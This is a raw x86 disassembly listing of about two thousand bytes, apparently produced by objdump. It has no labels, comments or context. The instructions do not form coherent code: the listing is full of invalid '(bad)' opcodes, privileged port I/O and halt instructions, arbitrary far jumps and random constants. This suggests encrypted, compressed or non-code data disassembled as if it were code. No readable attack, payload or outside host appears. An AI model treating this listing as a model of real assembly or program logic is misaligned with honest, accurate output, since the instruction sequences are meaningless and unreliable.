  415a8e:	add    DWORD PTR [ebp+0xa],esp
  415a91:	mov    ds:0x2909a515,eax
  415a96:	push   ss
  415a97:	mov    bh,0x64
  415a99:	and    dl,ch
  415a9b:	fwait
  415a9c:	inc    esi
  415a9d:	or     al,0x3f
  415a9f:	pop    edi
  415aa0:	pop    edx
  415aa1:	pusha  
  415aa2:	xor    ch,ah
  415aa4:	les    eax,FWORD PTR [bx+0x67fb]
  415aa9:	inc    esp
  415aaa:	push   es
  415aab:	or     ah,BYTE PTR [ecx+0xf5bba41]
  415ab1:	sar    DWORD PTR [eax-0x5a],1
  415ab4:	sub    dh,dh
  415ab6:	into   
  415ab7:	dec    eax
  415ab8:	mov    eax,DWORD PTR [edi+0x6b]
  415abb:	test   BYTE PTR [edx],bh
  415abd:	es dec edi
  415abf:	push   0xd44634a6
  415ac4:	(bad)
  415ac7:	mov    ebp,0x989dc577
  415acc:	arpl   WORD PTR [ebp-0x38f0bf2a],sp
  415ad2:	xor    DWORD PTR ds:0xb6cd83eb,0x97a15bdb
  415adc:	idiv   DWORD PTR [ecx+0x2087d71e]
  415ae2:	cdq    
  415ae3:	push   edi
  415ae4:	out    0xa5,eax
  415ae6:	inc    ebx
  415ae7:	and    bh,BYTE PTR [ecx-0x3120fc34]
  415aed:	push   ss
  415aee:	repz ret 0x3b27
  415af2:	add    al,0x16
  415af4:	push   ebx
  415af5:	inc    esp
  415af6:	mov    ecx,fs
  415af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af9:	dec    eax
  415afa:	jecxz  0x415ab9
  415afc:	and    bh,BYTE PTR ds:0x8c2c5313
  415b02:	popf   
  415b03:	out    0x9f,eax
  415b05:	push   ss
  415b06:	or     eax,0x61975645
  415b0b:	cli    
  415b0c:	in     eax,0xd6
  415b0e:	not    BYTE PTR [edx+0x3f6fbe0f]
  415b14:	push   edi
  415b15:	inc    eax
  415b16:	pop    edi
  415b17:	sbb    ah,BYTE PTR [ecx+eax*1+0x7b]
  415b1b:	cmp    BYTE PTR [edx],al
  415b1d:	xor    ebx,DWORD PTR [eax+eiz*8+0x37]
  415b21:	and    edx,0xdf6ac719
  415b27:	mov    eax,ds:0xb74aa691
  415b2c:	mov    esi,0x6a836a08
  415b31:	rcl    DWORD PTR [ebx+0x3c],1
  415b34:	adc    edi,DWORD PTR [eax-0x11d0aff2]
  415b3a:	xchg   DWORD PTR [ecx+0x2825b915],esi
  415b40:	xor    eax,0xd68edaeb
  415b45:	add    bh,bh
  415b47:	stos   BYTE PTR es:[edi],al
  415b48:	out    dx,eax
  415b49:	mov    dl,0x60
  415b4b:	mov    al,0x93
  415b4d:	push   ebx
  415b4e:	mov    al,0xc5
  415b50:	cdq    
  415b51:	xor    edi,DWORD PTR [eax+0x78f615e8]
  415b57:	sbb    al,0x74
  415b59:	les    edi,FWORD PTR [edi]
  415b5b:	call   0x93ab6a36
  415b60:	sub    DWORD PTR [esi+0x25],edi
  415b63:	sub    esi,esi
  415b65:	inc    ebx
  415b66:	add    eax,0xe41832bc
  415b6b:	and    cl,BYTE PTR [esp+ecx*1+0x3]
  415b6f:	adc    BYTE PTR [edx+0x3e730290],bh
  415b75:	mov    DWORD PTR [ecx+ecx*4+0x79],edi
  415b79:	sub    eax,0xd78492c1
  415b7e:	dec    ecx
  415b7f:	aad    0xbb
  415b81:	jecxz  0x415be9
  415b83:	mov    ebp,0x8d749154
  415b88:	out    0xa3,al
  415b8a:	mov    ds:0x15092692,eax
  415b8f:	in     eax,0x6e
  415b91:	std    
  415b92:	mov    esp,0x8e2fec49
  415b97:	ror    ch,0x2c
  415b9a:	(bad)
  415b9d:	mov    dh,0xb0
  415b9f:	xchg   ebp,eax
  415ba0:	pop    ebx
  415ba1:	call   0xd281:0x8bd000b2
  415ba8:	mov    edi,0x746b02b5
  415bad:	and    al,0xd1
  415baf:	mov    esi,0xc0fb59ea
  415bb4:	or     ecx,DWORD PTR [edx+edi*1+0x1b]
  415bb8:	jg     0x415c11
  415bba:	lock iret 
  415bbc:	jae    0x415b71
  415bbe:	shl    esi,1
  415bc0:	scas   eax,DWORD PTR es:[edi]
  415bc1:	fidivr DWORD PTR [ebx]
  415bc3:	jnp    0x415c0f
  415bc5:	(bad)  
  415bc6:	lahf   
  415bc7:	add    al,0xff
  415bc9:	adc    eax,0xefde5143
  415bce:	in     eax,0x36
  415bd0:	aam    0xe0
  415bd2:	dec    ecx
  415bd3:	or     DWORD PTR fs:[eax-0x64338782],ebp
  415bda:	xor    DWORD PTR [eax],edx
  415bdc:	dec    ebp
  415bdd:	lds    eax,FWORD PTR [ecx]
  415bdf:	mov    bh,0xbd
  415be1:	pop    edx
  415be2:	fcom   QWORD PTR [ebx]
  415be4:	lock mov al,ds:0xfa72ab7d
  415bea:	pop    edx
  415beb:	paddw  mm0,QWORD PTR [edx+0x56]
  415bef:	test   eax,0x980ae65a
  415bf4:	cmp    ah,0xe9
  415bf7:	sbb    al,bl
  415bf9:	and    al,0x30
  415bfb:	xor    edi,esp
  415bfd:	add    ebx,esi
  415bff:	aaa    
  415c00:	iret   
  415c01:	mov    BYTE PTR [ebx-0x4d],al
  415c04:	cdq    
  415c05:	call   0xcf0f274f
  415c0a:	fsub   QWORD PTR [ebp+0x45]
  415c0d:	dec    edx
  415c0e:	in     eax,dx
  415c0f:	fs jmp ebp
  415c12:	and    eax,0xe3d1423f
  415c17:	jmp    0x6214:0x1e5b53d3
  415c1e:	imul   esi,edx,0x7e
  415c21:	xchg   edi,eax
  415c22:	ret    0x9be4
  415c25:	push   ss
  415c26:	call   ecx
  415c28:	xor    al,0xf2
  415c2a:	inc    ebp
  415c2b:	mov    cl,0xe5
  415c2d:	out    0x91,eax
  415c2f:	test   eax,0xc6399aeb
  415c34:	hlt    
  415c35:	and    eax,0x8b56f1aa
  415c3a:	jecxz  0x415c65
  415c3c:	rcl    BYTE PTR [ecx-0x419aa57d],0x87
  415c43:	xchg   DWORD PTR [ebx+0x2d],esp
  415c46:	cmp    eax,0x5737e155
  415c4b:	aaa    
  415c4c:	mov    esi,0x63a715f9
  415c51:	bound  edx,QWORD PTR [esi-0x7c9a8526]
  415c57:	cmp    cl,BYTE PTR [edi]
  415c59:	xchg   ecx,eax
  415c5a:	cmp    ch,BYTE PTR [esi+0x31624885]
  415c60:	scas   al,BYTE PTR es:[edi]
  415c61:	mov    ecx,0x9a95e861
  415c66:	test   al,0xe1
  415c68:	neg    DWORD PTR [eax-0x4c]
  415c6b:	xchg   ecx,eax
  415c6c:	push   edi
  415c6d:	in     al,0x23
  415c6f:	pushf  
  415c70:	adc    DWORD PTR [edi],0x6e94f247
  415c76:	mov    ah,BYTE PTR [edx+0x1ab53156]
  415c7c:	mov    eax,ds:0xc96ebe18
  415c81:	adc    eax,0x5cbfe592
  415c86:	nop
  415c87:	test   al,0x67
  415c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c8a:	sahf   
  415c8b:	push   edx
  415c8c:	sub    eax,0x64039cc
  415c91:	mov    edi,fs
  415c93:	mov    bl,0x5a
  415c95:	sbb    dl,BYTE PTR [edx-0x1d]
  415c98:	mov    ?,ebx
  415c9a:	add    eax,0xa26ccea4
  415c9f:	jnp    0x415c76
  415ca1:	mov    edi,0x182a7f1c
  415ca6:	out    dx,eax
  415ca7:	(bad)  
  415ca8:	adc    BYTE PTR [edi+0x59],bl
  415cab:	fcom   QWORD PTR [esi]
  415cad:	cli    
  415cae:	fimul  WORD PTR [ecx-0x2dbd7f9c]
  415cb4:	add    BYTE PTR [esi+0x995b483],al
  415cba:	mov    edx,0xc396178b
  415cbf:	addr16 push ebp
  415cc1:	jno    0x415ca1
  415cc3:	mov    eax,ds:0xeca4a87f
  415cc8:	fistp  DWORD PTR [ebx+edi*1]
  415ccb:	retf   0xb37a
  415cce:	fisubr DWORD PTR [eax+0x1c]
  415cd1:	lods   eax,DWORD PTR ds:[esi]
  415cd2:	mov    ecx,0x14ffdf25
  415cd7:	and    DWORD PTR [edx],ecx
  415cd9:	jmp    0x44fd:0xf7e4f845
  415ce0:	std    
  415ce1:	ins    BYTE PTR es:[edi],dx
  415ce2:	jo     0x415cfc
  415ce4:	xor    BYTE PTR [edx+0x29],cl
  415ce7:	inc    esp
  415ce8:	sbb    DWORD PTR [edi-0x5589c1d8],0x7b118fb8
  415cf2:	mov    eax,ds:0xd20c347a
  415cf7:	sbb    bx,WORD PTR [edi+0x734bace]
  415cfe:	aaa    
  415cff:	and    cl,dh
  415d01:	out    0x21,eax
  415d03:	xor    cl,BYTE PTR [edi-0x505d68cf]
  415d09:	pop    esi
  415d0a:	rcr    BYTE PTR [ecx+edi*4-0x2f],1
  415d0e:	popf   
  415d0f:	xchg   ebp,eax
  415d10:	stos   DWORD PTR es:[edi],eax
  415d11:	pop    ss
  415d12:	adc    al,0x2e
  415d14:	and    eax,0xa00d8c68
  415d19:	stc    
  415d1a:	sahf   
  415d1b:	inc    ebx
  415d1c:	cmp    DWORD PTR [edx+0x30],esp
  415d1f:	sbb    ebx,DWORD PTR cs:[edi+0x2a]
  415d23:	jmp    0xc12a:0x31a342af
  415d2a:	int    0x50
  415d2c:	fwait
  415d2d:	cwde   
  415d2e:	cmp    DWORD PTR [ebp-0x3a17a0cd],edi
  415d34:	mov    eax,DWORD PTR [ebp+0x5086de0f]
  415d3a:	ins    DWORD PTR es:[edi],dx
  415d3b:	xchg   edi,ebp
  415d3d:	ror    DWORD PTR [ebx],cl
  415d3f:	es push ebp
  415d41:	fwait
  415d42:	sub    BYTE PTR [ecx+0x23],cl
  415d45:	xor    dl,ch
  415d47:	(bad)  
  415d48:	(bad)  
  415d49:	push   esi
  415d4a:	out    0x96,al
  415d4c:	cmp    edx,DWORD PTR [esi-0x70]
  415d4f:	das    
  415d50:	adc    al,0xd8
  415d52:	or     bh,bl
  415d54:	dec    ebx
  415d55:	mov    ebp,0x31794f0c
  415d5a:	nop
  415d5b:	outs   dx,BYTE PTR ds:[esi]
  415d5c:	(bad)
  415d60:	dec    edi
  415d61:	add    esp,esp
  415d63:	or     ecx,0x90fd24a4
  415d69:	sub    ebp,DWORD PTR [ecx]
  415d6b:	adc    al,0xa4
  415d6d:	cli    
  415d6e:	cmp    DWORD PTR [ebx-0x48],esp
  415d71:	stos   DWORD PTR es:[edi],eax
  415d72:	repnz pop eax
  415d74:	clc    
  415d75:	lds    esp,FWORD PTR [ebx]
  415d77:	ret    
  415d78:	leave  
  415d79:	daa    
  415d7a:	lea    eax,[ecx]
  415d7c:	mov    ecx,0x91008cf5
  415d81:	mov    ch,BYTE PTR [ebp+0x112bb9f5]
  415d87:	add    ah,dl
  415d89:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d8b:	mov    ebx,0x10cda56c
  415d90:	(bad)  
  415d91:	adc    eax,0x94523776
  415d96:	push   edi
  415d97:	and    bl,0x19
  415d9a:	xchg   DWORD PTR [ebx],eax
  415d9c:	pop    ebp
  415d9d:	sub    edx,ebp
  415d9f:	mov    al,al
  415da1:	scas   eax,DWORD PTR es:[edi]
  415da2:	adc    dh,BYTE PTR [ebp+0x39]
  415da5:	cdq    
  415da6:	jno    0x415ddf
  415da8:	jns    0x415e11
  415daa:	mov    ah,0x33
  415dac:	or     al,0xa3
  415dae:	xor    al,0x42
  415db0:	hlt    
  415db1:	pop    ecx
  415db2:	rcl    BYTE PTR [ecx-0x51],cl
  415db5:	into   
  415db6:	or     DWORD PTR [ecx],0xffffffb9
  415db9:	pop    es
  415dba:	aaa    
  415dbb:	add    al,0xcc
  415dbd:	popf   
  415dbe:	push   ds
  415dbf:	std    
  415dc0:	repz pop ds
  415dc2:	gs xchg ebp,eax
  415dc4:	lds    esp,FWORD PTR [edi]
  415dc6:	pop    ebp
  415dc7:	cmc    
  415dc8:	les    eax,FWORD PTR [esi+0x56]
  415dcb:	imul   eax,DWORD PTR [esi-0xa],0xb0738da7
  415dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dd3:	in     al,0x98
  415dd5:	sub    eax,0x62316043
  415dda:	xchg   BYTE PTR [esi+0x60045d33],cl
  415de0:	lods   al,BYTE PTR ds:[esi]
  415de1:	sub    al,0xa9
  415de3:	xchg   ecx,eax
  415de4:	in     eax,0x3b
  415de6:	mov    al,ds:0xa4d10baa
  415deb:	adc    eax,0x3172024e
  415df0:	pop    esi
  415df1:	mov    ds:0x98dfbb26,eax
  415df6:	loop   0x415dc6
  415df8:	(bad)  
  415dfa:	or     DWORD PTR ds:0xbb9fe8ba,0xb813fed0
  415e04:	pop    eax
  415e05:	sbb    BYTE PTR [ebx+0x52442284],dh
  415e0b:	mov    bl,0xd3
  415e0d:	mov    WORD PTR [ecx+0x17ead08c],?
  415e13:	pop    edi
  415e14:	xor    eax,0x4dc22fac
  415e19:	popf   
  415e1a:	mov    al,0x68
  415e1c:	push   edx
  415e1d:	xor    cl,BYTE PTR [eax+edi*4]
  415e20:	jecxz  0x415dd9
  415e22:	inc    eax
  415e23:	sbb    BYTE PTR [ebx-0x5c8cfd8],bl
  415e29:	test   BYTE PTR [esi+0x21],0x9f
  415e2d:	push   0x5000517a
  415e32:	jl     0x415e78
  415e34:	mov    eax,ds:0xb39138c7
  415e39:	out    0xb8,al
  415e3b:	lods   eax,DWORD PTR ds:[esi]
  415e3c:	mov    ebx,0xa8276e8e
  415e41:	pop    es
  415e42:	mov    al,0xe0
  415e44:	xchg   ecx,eax
  415e45:	(bad)  
  415e46:	cmp    BYTE PTR [ebx+0x758ffabf],0x3d
  415e4d:	or     al,0x40
  415e4f:	adc    esp,eax
  415e51:	int3   
  415e52:	retf   
  415e53:	jne    0x415e68
  415e55:	mov    ch,0x33
  415e57:	test   ah,0xce
  415e5a:	or     BYTE PTR [ebx+0x2a0df95c],cl
  415e60:	in     eax,dx
  415e61:	push   ecx
  415e62:	mov    esi,0xda18b898
  415e67:	pop    ebx
  415e68:	jno    0x415ece
  415e6a:	cmc    
  415e6b:	cmp    DWORD PTR [edx+0x142e27b4],ecx
  415e71:	pushf  
  415e72:	cmp    eax,0x948ddffb
  415e77:	aad    0x6f
  415e79:	pop    eax
  415e7a:	mov    ds:0xcf5dc8f0,al
  415e7f:	mov    ah,0xf6
  415e81:	ss cmc 
  415e83:	push   edi
  415e84:	mov    eax,ds:0x301d5e74
  415e89:	lea    ecx,[edi+0x4b]
  415e8c:	pop    esi
  415e8d:	cmp    BYTE PTR [edi],0x1e
  415e90:	push   ebx
  415e91:	xor    BYTE PTR [ecx+0xd4ba91],dl
  415e97:	mov    cl,0xbb
  415e99:	sar    BYTE PTR [ebx+edi*4+0x28],cl
  415e9d:	adc    dh,al
  415e9f:	in     al,dx
  415ea0:	inc    ebp
  415ea1:	push   ecx
  415ea2:	iret   
  415ea3:	pop    esi
  415ea4:	stos   DWORD PTR es:[edi],eax
  415ea5:	rcr    DWORD PTR [ebx],cl
  415ea7:	retf   
  415ea8:	scas   eax,DWORD PTR es:[edi]
  415ea9:	and    ebx,DWORD PTR [ebp+0x2afc2c04]
  415eaf:	cwde   
  415eb0:	imul   ebx,DWORD PTR [edx-0x764f8818],0x6a
  415eb7:	mov    edx,ecx
  415eb9:	inc    esp
  415eba:	scas   al,BYTE PTR es:[edi]
  415ebb:	sbb    al,0xb7
  415ebd:	inc    edx
  415ebe:	icebp  
  415ebf:	mov    eax,0xecc8d894
  415ec4:	stos   BYTE PTR es:[edi],al
  415ec5:	add    DWORD PTR ds:0x3d1cca6,ecx
  415ecb:	or     DWORD PTR ds:0x7c227406,esp
  415ed1:	xchg   edi,eax
  415ed2:	or     BYTE PTR [ebp-0x5c],al
  415ed5:	addr16 dec esp
  415ed7:	cdq    
  415ed8:	shr    BYTE PTR [ecx+0x3d],0x5e
  415edc:	sahf   
  415edd:	mov    bl,0x8e
  415edf:	mov    esp,0x10b1eafb
  415ee4:	push   cs
  415ee5:	dec    ebx
  415ee6:	out    0xaf,eax
  415ee8:	inc    eax
  415ee9:	or     al,0x81
  415eeb:	out    dx,al
  415eec:	aaa    
  415eed:	mov    bh,0xad
  415eef:	fwait
  415ef0:	jno    0x415f18
  415ef2:	bound  ebp,QWORD PTR [eax+eax*4]
  415ef5:	push   ebp
  415ef6:	loope  0x415e88
  415ef8:	mov    ds:0x94bffb81,eax
  415efd:	cs aam 0x40
  415f00:	xor    edx,DWORD PTR [ebx+0x4a]
  415f03:	adc    BYTE PTR [ebp+edi*4-0x58df1a90],cl
  415f0a:	loopne 0x415ef6
  415f0c:	adc    BYTE PTR [esi-0x50],dl
  415f0f:	sbb    bl,al
  415f11:	call   0x88a5ba3a
  415f16:	mov    ds:0xe6bae7a4,al
  415f1b:	sbb    esp,DWORD PTR [ebx+0x52]
  415f1e:	lods   eax,DWORD PTR ds:[esi]
  415f1f:	retf   0x45ae
  415f22:	outs   dx,DWORD PTR ds:[esi]
  415f23:	jmp    0x56a5:0xca49a00c
  415f2a:	(bad)  [ebp-0x6d64870b]
  415f30:	pop    ds
  415f31:	sub    BYTE PTR [ebp-0x6ba4b2d7],dh
  415f37:	push   ebx
  415f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f39:	inc    eax
  415f3a:	and    edi,DWORD PTR [esi+0x67]
  415f3d:	inc    esp
  415f3e:	push   ebx
  415f3f:	dec    ebx
  415f40:	mov    ds:0xf27154f2,eax
  415f45:	retf   
  415f46:	outs   dx,BYTE PTR ds:[esi]
  415f47:	pop    ebx
  415f48:	jb     0x415f24
  415f4a:	xor    al,0x82
  415f4c:	scas   al,BYTE PTR es:[edi]
  415f4d:	fdivr  QWORD PTR [ebx-0x17]
  415f50:	arpl   WORD PTR [edx+0x6fdbf4db],ax
  415f56:	mov    ebx,0x2adb1c64
  415f5b:	inc    ebx
  415f5c:	jle    0x415fb5
  415f5e:	xor    edx,0x923297f9
  415f64:	and    eax,0x8393c0b8
  415f69:	outs   dx,BYTE PTR ds:[esi]
  415f6a:	xchg   esi,eax
  415f6b:	jo     0x415efc
  415f6d:	cmp    eax,0xa12c0ed
  415f72:	cmc    
  415f73:	dec    ebx
  415f74:	stc    
  415f75:	mov    dl,0x43
  415f77:	mov    eax,0x23de6431
  415f7c:	repz add al,0xb
  415f80:	dec    BYTE PTR [edi-0x2f]
  415f83:	adc    ebx,DWORD PTR [edx+0x1f5ddb92]
  415f89:	es jmp 0x415fb6
  415f8c:	scas   al,BYTE PTR es:[edi]
  415f8d:	jae    0x415ff2
  415f8f:	dec    eax
  415f90:	ins    DWORD PTR es:[edi],dx
  415f91:	xchg   DWORD PTR [ecx+0x5d84872a],ebx
  415f97:	repnz repnz pop eax
  415f9a:	mov    ecx,ebx
  415f9c:	lods   eax,DWORD PTR ds:[esi]
  415f9d:	clc    
  415f9e:	mov    edi,DWORD PTR [esi+0x63]
  415fa1:	sbb    eax,0x7321d62d
  415fa6:	xchg   ecx,eax
  415fa7:	jno    0x415fa7
  415fa9:	add    al,0x32
  415fab:	(bad)  
  415fac:	outs   dx,BYTE PTR ds:[esi]
  415fad:	xchg   DWORD PTR ds:0xc7ff008a,esi
  415fb3:	out    0x3c,al
  415fb5:	inc    ecx
  415fb6:	push   ebp
  415fb7:	(bad)  
  415fb8:	xchg   esp,eax
  415fb9:	scas   eax,DWORD PTR es:[edi]
  415fba:	or     edi,DWORD PTR [ecx-0x81996a4]
  415fc0:	div    BYTE PTR [esi]
  415fc2:	popf   
  415fc3:	scas   eax,DWORD PTR es:[edi]
  415fc4:	test   BYTE PTR [eax+0x1106f506],bh
  415fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fcb:	jo     0x415fd2
  415fcd:	pop    es
  415fce:	inc    esi
  415fcf:	adc    eax,0x8b5c6543
  415fd4:	retf   0x669b
  415fd7:	jnp    0x416039
  415fd9:	sub    esi,0x22
  415fdc:	jns    0x415f64
  415fde:	stc    
  415fdf:	adc    DWORD PTR [esi+0x4a],edx
  415fe2:	mov    al,ds:0x674df53
  415fe7:	mov    BYTE PTR [esi],0x8b
  415fea:	repz or ebp,DWORD PTR [ebx]
  415fed:	std    
  415fee:	fcomp  st(2)
  415ff0:	in     eax,0x6d
  415ff2:	jmp    DWORD PTR gs:[esi+0x12]
  415ff6:	ins    BYTE PTR es:[edi],dx
  415ff7:	jl     0x415fbf
  415ff9:	arpl   WORD PTR [esi+0x1354f632],bp
  415fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416000:	push   ss
  416001:	imul   DWORD PTR [eax]
  416003:	pop    esi
  416004:	dec    esp
  416005:	cs inc esp
  416007:	stos   BYTE PTR es:[edi],al
  416008:	cmc    
  416009:	sub    ah,0x86
  41600c:	mov    cl,0x4c
  41600e:	popa   
  41600f:	and    eax,0x10f50b0
  416014:	sbb    al,0x4c
  416016:	mov    edi,0x2dc74c06
  41601b:	and    eax,0x8044e278
  416020:	inc    ecx
  416021:	out    dx,al
  416022:	cld    
  416023:	in     eax,dx
  416024:	(bad)  
  416025:	mov    ebx,0xc4602131
  41602a:	cli    
  41602b:	dec    esi
  41602c:	(bad)  
  41602d:	or     dl,0x98
  416030:	mov    bl,0xb6
  416032:	sbb    DWORD PTR [esi-0x3492886],edx
  416038:	outs   dx,DWORD PTR ds:[esi]
  416039:	je     0x416084
  41603b:	sub    bl,BYTE PTR [ebx-0x6f1aa6f1]
  416041:	nop
  416042:	dec    ebx
  416043:	mov    ebp,0xa1dc0efb
  416048:	cwde   
  416049:	mov    ebp,0x5b0973e6
  41604e:	mov    dl,0x10
  416050:	push   ebx
  416051:	cmp    BYTE PTR [ecx+0x28],ah
  416054:	push   ebx
  416055:	lahf   
  416056:	dec    esi
  416057:	mov    ds:0x5b7aa666,al
  41605c:	cmp    BYTE PTR [eax+0x55],ah
  41605f:	div    BYTE PTR [ecx+0x40]
  416062:	mov    edi,0xe251d92f
  416067:	jae    0x41604a
  416069:	hlt    
  41606a:	xor    ebx,edx
  41606c:	hlt    
  41606d:	mov    edx,0x10f06ee0
  416072:	push   es
  416073:	xor    eax,DWORD PTR ds:0xb15a3678
  416079:	mov    bl,0x51
  41607b:	out    dx,eax
  41607c:	call   0x76b54e60
  416081:	pop    es
  416082:	loopne 0x4160d9
  416084:	(bad)  
  416086:	or     esp,ebx
  416088:	(bad)  
  416089:	cmp    al,bl
  41608b:	in     al,dx
  41608c:	retf   0xe12a
  41608f:	jns    0x41606d
  416091:	loope  0x4160f9
  416093:	les    esi,FWORD PTR [edx+0x18242ba4]
  416099:	enter  0xf28,0x4
  41609d:	fisttp QWORD PTR [eax+0x39]
  4160a0:	retf   
  4160a1:	xchg   DWORD PTR [eax+0x54],esp
  4160a4:	das    
  4160a5:	lock sahf 
  4160a7:	xrelease xchg DWORD PTR [eax-0x5b],ebx
  4160ab:	pop    ss
  4160ac:	arpl   ax,dx
  4160ae:	fld    QWORD PTR [edx-0x5d21d3b0]
  4160b4:	into   
  4160b5:	cmp    edx,DWORD PTR [edi-0x2d]
  4160b8:	loopne 0x41611c
  4160ba:	pop    esp
  4160bb:	and    bh,BYTE PTR [eax-0x3d]
  4160be:	sbb    BYTE PTR [ecx+0x3ae45346],bh
  4160c4:	and    DWORD PTR [ecx-0x576c8bde],0x65
  4160cb:	lock adc DWORD PTR [esi+ebx*1+0x1c],0xffffffdb
  4160d1:	ins    BYTE PTR es:[edi],dx
  4160d2:	dec    edi
  4160d3:	sar    DWORD PTR [ebx-0x31],cl
  4160d6:	lds    ebx,FWORD PTR [ecx+0x574c885c]
  4160dc:	jl     0x41612b
  4160de:	and    DWORD PTR [edi+0x30],0x63
  4160e2:	adc    al,0x2b
  4160e4:	jecxz  0x4160c7
  4160e6:	mov    eax,ds:0x2091bbe6
  4160eb:	adc    al,0xe5
  4160ed:	int    0x97
  4160ef:	into   
  4160f0:	and    BYTE PTR [ecx-0x33199cda],ch
  4160f6:	call   0x423a:0x4743d3a5
  4160fd:	mov    ecx,0x7b7c9144
  416102:	xor    DWORD PTR [ebx+0xbeaea40],esi
  416108:	pop    ebx
  416109:	(bad)  
  41610a:	push   esi
  41610b:	rol    ebx,cl
  41610d:	xchg   esi,eax
  41610e:	aam    0x69
  416110:	jmp    0x5f4eb732
  416115:	push   es
  416116:	cli    
  416117:	adc    ch,al
  416119:	outs   dx,BYTE PTR ds:[esi]
  41611a:	inc    ecx
  41611b:	fld    QWORD PTR [esi+edi*4-0x30]
  41611f:	sub    DWORD PTR [eiz*2+0x5b4f48a4],eax
  416126:	fld    QWORD PTR ds:0xafdcdc9
  41612c:	out    0xfd,eax
  41612e:	imul   esi,DWORD PTR [edx],0x472cb7db
  416134:	or     ecx,edi
  416136:	inc    ebp
  416137:	sti    
  416138:	xchg   esp,eax
  416139:	jae    0x416180
  41613b:	or     edx,DWORD PTR [esp+edi*1]
  41613e:	xchg   ebx,eax
  41613f:	jno    0x416154
  416141:	imul   edx,ebx,0xf025fcaf
  416147:	sub    bl,bh
  416149:	in     eax,0xf7
  41614b:	inc    edi
  41614c:	into   
  41614d:	ret    0x44bb
  416150:	aad    0xb3
  416152:	(bad)  
  416153:	and    al,0x86
  416155:	sbb    al,0xa6
  416157:	xor    al,0x6b
  416159:	dec    eax
  41615a:	cdq    
  41615b:	pop    ss
  41615c:	test   DWORD PTR [ebx-0x5d],eax
  41615f:	repz inc DWORD PTR [ebx+0x40]
  416163:	test   al,0xb3
  416165:	sub    eax,DWORD PTR [eax-0x71626a43]
  41616b:	iret   
  41616c:	cmp    al,0x84
  41616e:	mov    esp,0xe9ed14cd
  416173:	cmp    dl,al
  416175:	mov    esp,0x8bde7317
  41617a:	dec    ebx
  41617b:	xchg   DWORD PTR [edx-0x32],esp
  41617e:	sbb    eax,0x30da582a
  416183:	mov    esi,0xb1bcd964
  416188:	sub    esi,DWORD PTR [edi-0x6f]
  41618b:	add    al,0xea
  41618d:	mov    esp,0x1292cdf2
  416192:	push   es
  416193:	xchg   edi,eax
  416194:	mov    dh,0xc4
  416196:	push   edi
  416197:	sub    BYTE PTR [edx+0x1],al
  41619a:	push   ebx
  41619b:	add    eax,0x80803a1f
  4161a0:	add    al,0xe
  4161a2:	cmc    
  4161a3:	aam    0x3a
  4161a5:	lahf   
  4161a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161a7:	xor    ah,BYTE PTR gs:[ecx]
  4161aa:	xchg   DWORD PTR [eax],ebp
  4161ac:	add    eax,0xd6c941b0
  4161b1:	xchg   esp,eax
  4161b2:	int    0x7b
  4161b4:	fist   DWORD PTR [ebx+0x4e30db87]
  4161ba:	xchg   ebx,eax
  4161bb:	cmp    dh,cl
  4161bd:	xchg   edi,eax
  4161be:	xchg   ebx,eax
  4161bf:	js     0x416155
  4161c1:	pop    ss
  4161c2:	mov    ch,BYTE PTR [edi+edx*8]
  4161c5:	mov    ebx,0x5b86b9b7
  4161ca:	jo     0x416243
  4161cc:	leave  
  4161cd:	fcom   DWORD PTR [edi]
  4161cf:	mov    ds,ecx
  4161d1:	stc    
  4161d2:	imul   eax,DWORD PTR [esi],0x7609031e
  4161d8:	dec    esi
  4161d9:	mov    ds:0xa586df52,eax
  4161de:	cwde   
  4161df:	push   edx
  4161e0:	jne    0x4161f1
  4161e2:	data16 and al,0x6b
  4161e5:	mov    edx,0xa31672be
  4161ea:	jecxz  0x41617b
  4161ec:	jo     0x4161cb
  4161ee:	cmp    al,0xb4
  4161f0:	shl    ebx,cl
  4161f2:	nop
  4161f3:	clc    
  4161f4:	lock fdivp st(5),st
  4161f7:	je     0x416220
  4161f9:	popa   
  4161fa:	mov    al,ds:0xb3c844fd
  4161ff:	(bad)  
  416200:	icebp  
  416201:	test   eax,0x579e905c
  416206:	mov    al,ds:0x44ec984a
  41620b:	(bad)  
  41620c:	lds    edx,FWORD PTR [esi]
  41620e:	xor    DWORD PTR [eax+0x3d],eax
  416211:	and    DWORD PTR [edx],ebp
  416213:	mov    bl,0xef
  416215:	inc    ecx
  416216:	mov    edi,0x389db16
  41621b:	or     al,0x9b
  41621d:	mov    ecx,0xf4d17fde
  416222:	mov    eax,0x1da0199f
  416227:	outs   dx,DWORD PTR ds:[esi]
  416228:	fisubr DWORD PTR [esi+0x38c0adf8]
  41622e:	cmpxchg DWORD PTR [eax],ebx
  416231:	sub    edi,DWORD PTR [ecx+ebp*4]
  416234:	daa    
  416235:	lahf   
  416236:	cwde   
  416237:	(bad)  
  416239:	js     0x41623e
  41623b:	scas   eax,DWORD PTR es:[edi]
  41623c:	ror    DWORD PTR [esi-0x58],1
  41623f:	mov    ch,0x2
  416241:	mov    WORD PTR [esi],ss
  416243:	cmp    DWORD PTR [edi-0x19],ebp
  416246:	rcr    BYTE PTR ds:[edi-0x42a5e5e3],cl
  41624d:	stc    
  41624e:	mov    BYTE PTR [edi],ah
  416250:	les    esp,FWORD PTR [esi]
  416252:	and    BYTE PTR [eax+0x53],dh
  416255:	adc    dh,0x27
  416258:	inc    eax
  416259:	cwde   
  41625a:	push   edi
  41625b:	std    
  41625c:	daa    
  41625d:	mov    cs,WORD PTR [esi]
  41625f:	dec    ebp
  416260:	ins    BYTE PTR es:[edi],dx
  416261:	repz rcr BYTE PTR [ecx-0x34],cl
  416265:	fs ins BYTE PTR es:[edi],dx
  416267:	out    0x19,al
  416269:	jge    0x4162ce
  41626b:	inc    ecx
  41626c:	int3   
  41626d:	outs   dx,BYTE PTR ds:[esi]
  41626e:	cmp    eax,esi
  416270:	jne    0x4162e5
  416272:	push   0xffffff84
  416274:	imul   edi,DWORD PTR [edx],0x50
  416277:	dec    ebp
  416278:	dec    esp
  416279:	(bad)  
  41627b:	pop    ebx
  41627c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41627d:	push   ecx
  41627e:	into   
